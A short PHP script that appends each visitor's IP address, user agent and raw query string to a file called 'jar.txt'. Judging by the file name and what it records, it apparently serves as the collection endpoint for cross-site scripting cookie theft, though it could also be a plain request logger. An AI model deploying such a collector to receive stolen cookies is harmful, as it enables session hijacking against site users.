<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt', 'a');

fwrite($fp,$ip.' '.$browser." \n");
fwrite($fp, urlencode($_SERVER['QUERY_STRING']). "\n\n");
fclose($fp);
?>
